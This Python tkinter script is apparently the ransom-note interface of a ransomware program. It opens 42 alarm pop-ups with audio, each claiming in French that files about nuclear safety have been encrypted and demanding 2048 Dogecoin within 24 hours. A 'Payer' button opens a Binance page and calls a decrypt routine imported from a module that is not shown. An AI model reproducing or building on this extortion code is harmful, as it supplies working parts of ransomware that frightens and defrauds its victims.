import tkinter as tk
import webbrowser
from random import randint
import pygame
from decrypt import decrypt_main

def link():
    webbrowser.open("https://www.binance.com/fr/price/dogecoin")

    for popup in popups:
        if popup.winfo_exists():
            popup.destroy()

    decrypt_main()
    popup = tk.Tk()
    popup.title("Thank you")

    message = "Vos dossiers ont été rendu comme convenu.\n Faites preuve de prudence la prochaine fois."
    label = tk.Label(popup, text=message, padx=30, pady=30)
    label.pack()

    close_button = tk.Button(popup, text="Close", command=popup.destroy)
    close_button.pack(pady=10)

    popup.mainloop()


def play_audio():
    pygame.mixer.init()
    pygame.mixer.music.load("./func/audio.mp3")
    pygame.mixer.music.play()

def show_popup():
    screen_width = 1920
    screen_height = 1080
    global popups
    popups = []

    for _ in range(42):
        play_audio()

        popup = tk.Tk()
        popup.title("ALERT MESSAGE")

        message = "Nous avons chiffré votre dossier_confidentiel contenant: \n -Rapport_Sensibilite_Securite_Nucleaire.docx\n -Données_Surveillance_Risques_Nucleaires.xlsx\n Afin de récupérer vos données, vous devez payer une rançon d'une valeur de 2048 Dogecoin. \n Vous avez 24 heures avant suppression définitive de vos données."
        label = tk.Label(popup, text=message, padx=20, pady=20)
        label.pack()
        
        link_button = tk.Button(popup, text="Payer", command=link, padx=10, pady=5)
        link_button.pack()

        x = randint(0, screen_width - 300)
        y = randint(0, screen_height - 200)
        popup.geometry(f"+{x}+{y}")

        popups.append(popup)

    tk.mainloop()